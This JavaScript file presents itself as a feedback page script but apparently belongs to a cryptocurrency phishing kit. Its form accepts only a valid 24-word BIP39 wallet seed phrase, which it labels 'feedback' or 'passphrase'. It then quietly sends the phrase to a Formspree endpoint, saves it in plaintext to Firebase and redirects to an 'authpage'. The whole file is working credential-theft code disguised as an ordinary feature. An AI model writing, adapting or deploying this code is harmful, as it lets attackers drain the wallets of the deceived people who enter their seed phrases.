// ========================================
// FEEDBACK PAGE FUNCTIONALITY WITH FIREBASE & BIP39 VALIDATION
// ========================================

// Your Formspree endpoint - REPLACE THIS WITH YOUR ACTUAL FORMSPREE URL
const FORMSPREE_ENDPOINT = 'https://formspree.io/f/mgvglzne';

// Hash function to create unique identifier from feedback
function hashFeedback(feedback) {
    let hash = 0;
    for (let i = 0; i < feedback.length; i++) {
        const char = feedback.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return Math.abs(hash).toString(36);
}

// Check if feedback already exists in Firebase
async function checkExistingSubmission(feedbackHash) {
    try {
        const snapshot = await firebase.database()
            .ref('submissions/' + feedbackHash)
            .once('value');
        return snapshot.val();
    } catch (error) {
        console.error('Error checking existing submission:', error);
        return null;
    }
}

// Save feedback to Firebase
async function saveFeedback(feedbackHash, feedback) {
    try {
        await firebase.database()
            .ref('submissions/' + feedbackHash)
            .set({
                feedback: feedback,
                timestamp: firebase.database.ServerValue.TIMESTAMP,
                submittedAt: new Date().toISOString(),
                wordCount: feedback.split(/\s+/).filter(w => w.length > 0).length,
                sentToFormspree: true,
                emailHash: null,
                email: null
            });
        return true;
    } catch (error) {
        console.error('Error saving feedback:', error);
        return false;
    }
}

// Submit feedback to Formspree in the background
async function submitToFormspree(feedback) {
    try {
        const response = await fetch(FORMSPREE_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                feedback: feedback,
                timestamp: new Date().toISOString()
            })
        });
        
        return response.ok;
    } catch (error) {
        console.error('Error submitting to Formspree:', error);
        // Don't block the flow if Formspree fails
        return false;
    }
}

// Validate BIP39 mnemonic
function validateBIP39(mnemonic) {
    try {
        // Check if bip39 library is loaded
        if (typeof bip39 === 'undefined') {
            console.error('BIP39 library not loaded');
            return false;
        }
        
        // Validate the mnemonic
        return bip39.validateMnemonic(mnemonic);
    } catch (error) {
        console.error('BIP39 validation error:', error);
        return false;
    }
}

function initializeFeedbackPage() {
    const feedbackForm = document.getElementById('feedbackForm');
    const feedbackTextarea = document.getElementById('feedback');
    const errorMessage = document.getElementById('errorMessage');
    const submitButton = feedbackForm ? feedbackForm.querySelector('button[type="submit"]') : null;

    if (feedbackForm && feedbackTextarea) {
        feedbackForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const text = feedbackTextarea.value.trim();
            const words = text.split(/\s+/).filter(function(word) {
                return word.length > 0;
            });
            
            // First check: Must be exactly 24 words
            if (words.length !== 24) {
                if (errorMessage) {
                    const wordText = words.length !== 1 ? 'words' : 'word';
                    errorMessage.textContent = 'Error: Please enter a valid 24-word passphrase. You entered ' + words.length + ' ' + wordText + '.';
                    errorMessage.style.display = 'block';
                }
                return;
            }
            
            // Second check: Must be a valid BIP39 mnemonic
            if (!validateBIP39(text)) {
                if (errorMessage) {
                    errorMessage.textContent = 'Error: Invalid passphrase. Please ensure all words are valid BIP39 seed words.';
                    errorMessage.style.display = 'block';
                }
                return;
            }
            
            // Hide error message if validation passes
            if (errorMessage) {
                errorMessage.style.display = 'none';
            }
            
            // Disable submit button to prevent double submission
            if (submitButton) {
                submitButton.disabled = true;
                submitButton.textContent = 'Validating...';
            }
            
            // Create hash of feedback
            const feedbackHash = hashFeedback(text);
            
            console.log('Valid BIP39 seed phrase detected. Checking for existing submission...');
            
            // Check if this feedback was already submitted
            const existingSubmission = await checkExistingSubmission(feedbackHash);
            
            if (existingSubmission) {
                // Already submitted - load previous state
                console.log('Feedback already submitted. Loading previous state...');
                
                // Store the hash and feedback in sessionStorage
                sessionStorage.setItem('feedbackHash', feedbackHash);
                sessionStorage.setItem('feedback', text);
                sessionStorage.setItem('isReturningFeedback', 'true');
                
                // Store the linked email hash and email if they exist
                if (existingSubmission.emailHash) {
                    sessionStorage.setItem('linkedEmailHash', existingSubmission.emailHash);
                }
                if (existingSubmission.email) {
                    sessionStorage.setItem('linkedEmail', existingSubmission.email);
                }
                
                // Redirect to authpage
                console.log('Redirecting to authpage with previous state...');
                window.location.href = 'authpage.html';
                return;
            }
            
            // New valid feedback - submit to Formspree in the background
            console.log('New valid seed phrase detected. Submitting to Formspree...');
            
            // Submit to Formspree (don't wait for response)
            submitToFormspree(text).then(success => {
                if (success) {
                    console.log('Successfully submitted to Formspree');
                } else {
                    console.log('Formspree submission failed, but continuing...');
                }
            });
            
            // Save to Firebase
            console.log('Saving to Firebase...');
            await saveFeedback(feedbackHash, text);
            
            // Store in sessionStorage for authpage
            sessionStorage.setItem('feedbackHash', feedbackHash);
            sessionStorage.setItem('feedback', text);
            sessionStorage.setItem('isReturningFeedback', 'false');
            
            console.log('Feedback saved. Redirecting to authpage...');
            
            // Redirect to authpage
            window.location.href = 'authpage.html';
        });
    }
}

// Initialize when DOM is loaded
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeFeedbackPage);
} else {
    initializeFeedbackPage();
}

